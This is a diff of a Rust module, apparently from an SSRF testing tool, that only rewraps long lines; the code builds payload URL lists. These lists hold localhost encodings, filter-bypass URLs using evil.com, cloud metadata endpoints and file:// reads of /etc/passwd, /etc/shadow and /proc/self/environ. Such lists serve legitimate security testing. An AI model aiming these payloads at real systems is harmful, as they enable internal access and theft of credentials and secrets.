@@ -9,13 +9,22 @@ pub fn generate_localhost_variants(port: u16) -> Vec<UrlVariant> {
         UrlVariant::new("127.0.0.1", format!("http://127.0.0.1:{}", port)),
         UrlVariant::new("IPv6 ::1", format!("http://[::1]:{}", port)),
         UrlVariant::new("IPv6 full", format!("http://[0:0:0:0:0:0:0:1]:{}", port)),
-        UrlVariant::new("Decimal IP", format!("http://{}:{}", ip_to_decimal(127, 0, 0, 1), port)),
-        UrlVariant::new("Hex IP", format!("http://{}:{}", ip_to_hex(127, 0, 0, 1), port)),
+        UrlVariant::new(
+            "Decimal IP",
+            format!("http://{}:{}", ip_to_decimal(127, 0, 0, 1), port),
+        ),
+        UrlVariant::new(
+            "Hex IP",
+            format!("http://{}:{}", ip_to_hex(127, 0, 0, 1), port),
+        ),
         UrlVariant::new("Octal IP", format!("http://0177.0.0.1:{}", port)),
         UrlVariant::new("localtest.me", format!("http://localtest.me:{}", port)),
         UrlVariant::new("nip.io", format!("http://127.0.0.1.nip.io:{}", port)),
         UrlVariant::new("sslip.io", format!("http://127.0.0.1.sslip.io:{}", port)),
-        UrlVariant::new("Null byte", format!("http://localhost%00.evil.com:{}", port)),
+        UrlVariant::new(
+            "Null byte",
+            format!("http://localhost%00.evil.com:{}", port),
+        ),
         UrlVariant::new("@ bypass", format!("http://evil.com@localhost:{}", port)),
         UrlVariant::new("# bypass", format!("http://localhost#@evil.com:{}", port)),
     ]
@@ -28,13 +37,23 @@ pub fn generate_internal_network_variants(port: u16) -> Vec<UrlVariant> {
         UrlVariant::new("10.x.x.x", format!("http://10.0.0.1:{}", port)),
         UrlVariant::new("172.16.x.x", format!("http://172.16.0.1:{}", port)),
         UrlVariant::new("192.168.x.x", format!("http://192.168.1.1:{}", port)),
-        
         // Cloud metadata endpoints
-        UrlVariant::new("AWS metadata", "http://169.254.169.254/latest/meta-data/".to_string()),
-        UrlVariant::new("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/".to_string()),
-        UrlVariant::new("Azure metadata", "http://169.254.169.254/metadata/instance".to_string()),
-        UrlVariant::new("DigitalOcean", "http://169.254.169.254/metadata/v1/".to_string()),
-        
+        UrlVariant::new(
+            "AWS metadata",
+            "http://169.254.169.254/latest/meta-data/".to_string(),
+        ),
+        UrlVariant::new(
+            "GCP metadata",
+            "http://metadata.google.internal/computeMetadata/v1/".to_string(),
+        ),
+        UrlVariant::new(
+            "Azure metadata",
+            "http://169.254.169.254/metadata/instance".to_string(),
+        ),
+        UrlVariant::new(
+            "DigitalOcean",
+            "http://169.254.169.254/metadata/v1/".to_string(),
+        ),
         // Common internal services
         UrlVariant::new("Docker", format!("http://172.17.0.1:{}", port)),
         UrlVariant::new("Kubernetes", "http://kubernetes.default.svc/".to_string()),
@@ -83,7 +102,10 @@ pub fn generate_file_variants() -> Vec<UrlVariant> {
         UrlVariant::new("passwd", "file:///etc/passwd".to_string()),
         UrlVariant::new("shadow", "file:///etc/shadow".to_string()),
         UrlVariant::new("hosts", "file:///etc/hosts".to_string()),
-        UrlVariant::new("Windows hosts", "file:///C:/Windows/System32/drivers/etc/hosts".to_string()),
+        UrlVariant::new(
+            "Windows hosts",
+            "file:///C:/Windows/System32/drivers/etc/hosts".to_string(),
+        ),
         UrlVariant::new("env", "file:///proc/self/environ".to_string()),
         UrlVariant::new("cmdline", "file:///proc/self/cmdline".to_string()),
     ]
